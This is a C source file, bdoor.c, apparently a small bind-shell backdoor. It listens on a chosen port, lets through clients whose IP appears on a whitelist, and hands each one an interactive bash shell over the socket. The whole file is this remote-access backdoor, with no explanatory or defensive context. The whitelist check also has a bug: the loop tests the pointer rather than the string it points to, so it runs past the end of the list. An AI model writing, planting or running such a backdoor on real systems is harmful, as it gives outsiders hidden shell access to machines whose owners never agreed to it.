/* bdoor.c */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>
#include <libgen.h>

#define DEBUG

#define REFUSE_MSG "Access denied."

void
usage(const char *prog_name)
{
	printf("Usage: %s <address> <port> <alloved_addresses> ...",
		prog_name);
}

/*
 * Check if arguments are in correct format and fill addrstr, portstr and
 * addr_whitelist.
 */
void
parse_args(int argc, char **argv, char **addrstr, char **portstr,
	char ***addr_whitelist)
{
	if (argc < 3) {
		usage(basename(argv[0]));
		exit(1);
	}

	*addrstr = argv[1];
	*portstr = argv[2];
	*addr_whitelist = argv + 3;
}

/*
 * Use given port and address and create a listening socket.
 */
int
create_listening_sock(char *addrstr, char *portstr)
{
	int fd, ret, optval = 1;
	struct addrinfo *res, *resorig, hints;

	memset(&hints, 0, sizeof (hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	if ((ret = getaddrinfo(addrstr, portstr, &hints, &res)) != 0)
		errx(1, "getaddrinfo: %s", gai_strerror(ret));

	for (resorig = res; res != NULL; res = res->ai_next) {
		if ((fd = socket(res->ai_family, res->ai_socktype,
				res->ai_protocol)) == -1)
			err(1, "socket");

		if (!bind(fd, res->ai_addr, res->ai_addrlen))
			break;
	}

	freeaddrinfo(resorig);

	/* Set reuseaddr so that we can use the port immediately after restart. */
	if ((setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
			&optval, sizeof (optval))) == -1)
		err(1, "setsockopt");

	if (listen(fd, SOMAXCONN))
		err(1, "listen");

	printf("--- Listening %s:%s ---\n", addrstr, portstr);

	return (fd);
}

int
addr_check(struct sockaddr_storage *ca, int storage_size, char **whitelist)
{
	int error;
	char numhost[NI_MAXHOST], service[NI_MAXSERV];
	char **str;
	struct sockaddr *s = (struct sockaddr *)ca;

	/* Resolve numeric value */
	if ((error = getnameinfo(s, storage_size, numhost,
		sizeof (numhost), service, sizeof (service), NI_NUMERICHOST)) != 0)
		errx(1, "getnameinfo: %s", gai_strerror(error));

	printf("-> Incomming connection: %s:%s\n", numhost, service);

	/* Check it against the whitelist */
	for (str = whitelist; str != NULL; ++str) {
		if (strcmp(*str, numhost) == 0)
			return (0);
	}

	return (-1);
}

int
accept_connection(int sock, char **whitelist)
{
	int client_sock;
	socklen_t sz;
	struct sockaddr_storage ca;

	printf("--- Waiting for connection ---\n");

	sz = sizeof (ca);
	if ((client_sock = accept(sock, (struct sockaddr *)&ca, &sz)) == -1)
		err(1, "accept");


	/* Now check the incomming connection */
	if (addr_check(&ca, sz, whitelist) == 0) {
		printf("--- Connection accepted ---\n");
	} else {
		printf("--- Connection refused ---\n");
		return (-1);
	}

	return (client_sock);
}

int
redirect_and_run_shell(int sock)
{
	int pid;

	switch (pid = fork()) {
	case -1:
		err(1, "fork");
	case 0:
		/* In child redirect stdin, stdout, stderr. */
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);

		execlp("bash", "bash", "-i", NULL);
		err(1, "execlp");
	default:
		return pid;
	}
}

void
process_client(int sock, char **whitelist)
{
	int pid, client_sock, stat, options = 0;

	if ((client_sock = accept_connection(sock, whitelist)) == -1)
		return;

	pid = redirect_and_run_shell(client_sock);
	waitpid(pid, &stat, options);

	if (WIFEXITED(stat)) {
		printf("-> Client exited bash with status %d\n", WEXITSTATUS(stat));
	} else if (WIFSIGNALED(stat)) {
		printf("-> Client bash was exited with signal %d\n", WTERMSIG(stat));
	} else {
		printf("-> Client exited in unrecognized way\n");
	}

	close(client_sock);

	printf("--- Connection closed ---\n");
}

int
main(int argc, char *argv[])
{
	int listening_sock;
	char *addrstr, *portstr;
	char **addr_whitelist;

	parse_args(argc, argv, &addrstr, &portstr, &addr_whitelist);

	fprintf(stderr, "%s [%d]\n", basename(argv[0]), getpid());

	listening_sock = create_listening_sock(addrstr, portstr);

	while (1) {
		process_client(listening_sock, addr_whitelist);
	}
}
